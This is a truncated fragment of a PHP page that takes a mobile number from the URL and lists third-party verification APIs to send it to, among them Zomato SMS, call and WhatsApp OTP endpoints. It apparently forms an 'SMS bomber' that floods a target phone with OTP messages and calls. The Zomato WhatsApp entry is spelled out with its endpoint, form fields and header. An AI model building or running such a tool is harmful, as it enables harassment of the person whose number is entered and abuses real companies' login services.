...
<body>
    ...
    if (isset($_GET['mobile'])) {
        ...
        $apis = [
            ...
            // API 2: Astroyogi GenerateOtpV3
            
            // API 3: Zomato SMS Verification
            [
            ...
            // API 4: Zomato Call Verification
            [
                "url" => "https://accounts.zomato.com/login/phone",
            ...
            // API 5: Zomato WhatsApp Verification
            [
                "url" => "https://accounts.zomato.com/login/phone",
                "data" => http_build_query(["number" => $mobile, "country_id" => "1", "lc" => "26fd3c9af2914791b566f84867425876", "type" => "initiate", "verification_type" => "whatsapp", "package_name" => "", "message_uuid" => ""]),
                "headers" => ["x-request-id: 4d846f85-75fe-4b54-9ddc-7d6916737690"]
            ],
